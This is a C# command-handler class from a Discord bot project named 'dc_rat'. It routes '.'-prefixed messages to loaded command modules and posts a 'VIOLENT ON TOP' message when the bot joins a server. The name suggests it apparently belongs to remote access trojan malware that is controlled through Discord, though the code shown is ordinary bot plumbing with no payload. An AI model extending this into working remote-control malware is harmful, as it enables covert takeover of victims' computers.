using System;
using System.Reflection;
using System.Threading.Tasks;
using Microsoft.Extensions.DependencyInjection;
using Discord.Commands;
using Discord.WebSocket;
using Newtonsoft.Json.Linq;
using Discord;
using System.Linq;
using Newtonsoft.Json;

namespace dc_rat
{
    public class CommandHandlingService
    {
        private readonly CommandService _commands;
        private readonly DiscordSocketClient _client;
        private readonly IServiceProvider _services;

        public CommandHandlingService(IServiceProvider services)
        {

            _commands = services.GetRequiredService<CommandService>();
            _client = services.GetRequiredService<DiscordSocketClient>();
            _services = services;

            // Event handlers
            _client.Ready += ClientReadyAsync;
            _client.MessageReceived += HandleCommandAsync;
            _client.JoinedGuild += SendJoinMessageAsync;
        }

        private async Task HandleCommandAsync(SocketMessage rawMessage)
        {
            if (rawMessage.Author.IsBot || !(rawMessage is SocketUserMessage message) || message.Channel is IDMChannel)
                return;

            var context = new SocketCommandContext(_client, message);

            int argPos = 0;

            string[] prefixes = { "." };

            if (prefixes.Any(x => message.HasStringPrefix(x, ref argPos)) || message.HasMentionPrefix(_client.CurrentUser, ref argPos))
            {
                var result = await _commands.ExecuteAsync(context, argPos, _services);

                if (!result.IsSuccess && result.Error.HasValue)          
                    await context.Channel.SendMessageAsync($":x: {result.ErrorReason}");          
            }
        }

        private async Task SendJoinMessageAsync(SocketGuild guild)
        {
            string joinMessage = "VIOLENT ON TOP";

            if (string.IsNullOrEmpty(joinMessage))
                return;

            foreach (var channel in guild.TextChannels.OrderBy(x => x.Position))
            {                               
                var botPerms = channel.GetPermissionOverwrite(_client.CurrentUser).GetValueOrDefault();

                if (botPerms.SendMessages == PermValue.Deny)
                    continue;

                try
                {
                    await channel.SendMessageAsync(joinMessage);
                    return;
                }
                catch 
                { 
                    continue;
                }
            }
        }

        private async Task ClientReadyAsync()
            => await Functions.SetBotStatusAsync(_client);

        public async Task InitializeAsync()
            => await _commands.AddModulesAsync(Assembly.GetEntryAssembly(), _services);
    }
}